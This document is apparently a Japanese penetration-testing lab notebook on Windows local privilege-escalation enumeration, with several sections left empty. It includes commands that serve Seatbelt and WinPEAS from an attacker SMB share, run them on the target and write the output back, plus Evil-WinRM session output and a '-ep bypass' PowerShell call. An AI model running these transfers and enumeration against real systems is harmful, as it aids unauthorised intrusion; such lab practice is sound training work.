# Local

## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)

### 転送・実行

```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\192.168.49.104\share\seatbelt_result.txt
```

### 実行結果抽出

```powershell

```


## Auto w/ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### 転送・実行

```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.104\share\peas_result.txt
```

### 実行結果抽出

```powershell

```

---
---

## Manual

### ユーザー

- 特に興味深い権限は持っていない
```sh
*Evil-WinRM* PS C:\Users\Sandra\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system  Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
*Evil-WinRM* PS C:\Users\Sandra\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
*Evil-WinRM* PS C:\Users\Sandra\Desktop> 

```




---

### システム情報


---

### ネットワーク

- ftpであったdb.devのポートは動作していなさそう


---

### インストール済みアプリケーション

```powershell
*Evil-WinRM* PS C:\> # Access deninedのときは、reg query "HKLM\..."
$paths = @(
"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*","HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*")
Get-ItemProperty -Path $paths -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion, InstallLocation | Sort-Object DisplayName

DisplayName                                                        DisplayVersion  InstallLocation
-----------                                                        --------------  ---------------
Ahsay Cloud Backup Suite                                           8.1.1.50        C:\Program Files\AhsayCBS\
Argus DVR Viewer
Argus Surveillance DVR
Microsoft Edge                                                     111.0.1661.41   C:\Program Files (x86)\Microsoft\Edge\Application
...
```

---

### 実行中のプロセス

- WebServerForAdminというのが気になる
```sh
*Evil-WinRM* PS C:\Program Files\AhsayCBS> # 除外ワードは,"<term>"で追加可能
ps | Where-Object -Property ProcessName -notin "svchost"

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   3409      52  2349504    2069008              2716   0 cbssvcX64
    136       9     6560       6760       0.42   3040   0 conhost
    136      10     6540      12552       0.05   5476   0 conhost
    568      22     1708       4700               460   0 csrss
    172      10     1540       3988               568   1 csrss
    261      14     3832      11308               796   0 dllhost
    421      51     7188      18700               168   0 DVR
    271      12     2016       9096              2624   0 DVRWatchdog
    700      25    24652      40008               316   1 dwm
     37       6     1536       3084               812   0 fontdrvhost
     37       6     1620       2896               820   1 fontdrvhost
      0       0       60          8                 0   0 Idle
    608      33    15864      52080              4420   1 LogonUI
   1200      24     6380      14872               712   0 lsass
      0       0      328      88832              1540   0 Memory Compression
    206      12     2032        280              4812   0 MicrosoftEdgeUpdate
    306      18     9120      23160              5904   0 MoUsoCoreWorker
    224      13     2908       7968              4836   0 msdtc
    606      81   197528     114428              2444   0 MsMpEng
    141       8     1288       5028              2948   0 nfsX64
      0      12     3828      11340                92   0 Registry
    115       7     1116       5120       0.56   2916   0 rotatelogs
    746      35    17476      21120              3544   0 SearchIndexer
    275      13     3004      11960              6044   0 SecurityHealthService
    626      11     4956       9584               660   0 services
    105       7     4204       6936              5696   0 SgrmBroker
     53       3     1056        928               352   0 smss
   2031       0      196        140                 4   0 System
    481      31    22212      40708              6540   0 taskhostw
    172      11     2864       7640              2972   0 VGAuthService
    117       7     1424       5504              2980   0 vm3dservice
    116       8     1536       5896              3392   1 vm3dservice
    416      24    10364      18604              2996   0 vmtoolsd
    257      20     5792      15252              4952   0 w3wp
    475      31     6080      14940              2568   0 WebServerForAdmin
    162      11     1352       6188               560   0 wininit
    246      12     2688      18284               652   1 winlogon
   4013      36    62184      76560       6.78   4704   0 winPEASx64
    148       9     1548       8044              4640   0 WmiApSrv
    373      17    10704      19888              4032   0 WmiPrvSE
   2321      34    75396      98760       3.41   3900   0 wsmprovhost
   1071      27    61736      79612       1.08   6016   0 wsmprovhost

```

- リアルタイムにプロセス監視するも特になし
```sh
*Evil-WinRM* PS C:\Users\Sandra> powershell -ep bypass -c 'import-module .\Watch-Command.ps1;ps -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30'

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    136       9     3392       9504       0.03   2708   0 conhost
   1070      26    63928      68204       1.00   3380   0 powershell
   2043       0      196        140                 4   0 System
   1213      24     6424      15068               712   0 lsass
   1037      25    69976      75764       1.31   3380   0 powershell
    341      12     2260      10452              5864   0 SearchProtocolHost
   1318      17     8076      16760               804   0 svchost
    867      15     4648      10544               924   0 svchost
    235      10     2028       6648               976   0 svchost
    211       9     1912       6136              1272   0 svchost
    213      14    60440      61252              1400   0 svchost
    260      12     2536       7288              1924   0 svchost
    422      17    12936      21680              2604   0 svchost
    326      17    22336      26816              2736   0 svchost
    748      84    70396      57676              4560   0 svchost
   2046       0      196        140                 4   0 System
    373      17    10652      19856              4032   0 WmiPrvSE
   2086      34    75300      98876       4.02   3900   0 wsmprovhost
   1383      33    67364      87980       1.27   6016   0 wsmprovhost
   1214      24     6492      15084               712   0 lsass
    606      81   197528     114428              2444   0 MsMpEng
   1279      24    69912      75736       1.66   3380   0 powershell
    627      11     5008       9600               660   0 services
   1319      17     8076      16760               804   0 svchost
    236      10     2028       6648               976   0 svchost
    427      32     9160      15876              2112   0 svchost
    171       9     1908       6832              2120   0 svchost
    399      16    12272      21228              2604   0 svchost
    327      17    22516      26996              2736   0 svchost
    129      10     6408      12632              3532   0 svchost
    728      84    70396      57676              4560   0 svchost
    224      13     2532       9900              5340   0 svchost
    552      29     9784      17920              5516   0 svchost
   2049       0      196        140                 4   0 System
    414      24    10368      18620              2996   0 vmtoolsd
    799      34    75364      98916       4.09   3900   0 wsmprovhost
   1447      33    67380      87996       1.27   6016   0 wsmprovhost
```


---

### PowerShellログ


---

### サービス


---

### スケジュールタスク


---

### 興味深い情報

#### C:\



#### C:\Users -> nothing

- adminのホームは覗けない
```sh
Evil-WinRM* PS C:\Users> tree /f
Folder PATH listing
Volume serial number is 7A11-DA09
C:.
ÃÄÄÄAdministrator
ÃÄÄÄDefaultAppPool
ÃÄÄÄPublic
ÀÄÄÄSandra
    ÃÄÄÄ3D Objects
    ÃÄÄÄContacts
    ÃÄÄÄDesktop
    ³       local.txt
    ³
    ÃÄÄÄDocuments
    ³       .env
    ³       Acq.dll
    ³       DVRParams.ini
    ³       Manifest.dll
    ³       program.exe
    ³       verisign.png
    ³       wab.dll
    ³
    ÃÄÄÄDownloads
    ÃÄÄÄFavorites
    ³   ³   Bing.url
    ³   ³
    ³   ÀÄÄÄLinks
    ÃÄÄÄLinks
    ³       Desktop.lnk
    ³       Downloads.lnk
    ³
    ÃÄÄÄMusic
    ÃÄÄÄPictures
    ³   ÃÄÄÄCamera Roll
    ³   ÀÄÄÄSaved Pictures
    ÃÄÄÄSaved Games
    ÃÄÄÄSearches
    ³       winrt--{S-1-5-21-4214290425-2411352775-3126579912-1002}-.searchconnector-ms
    ³
    ÀÄÄÄVideos

```


---
---

# WinPEAS

## 記録用（結果長い）

```powershell

```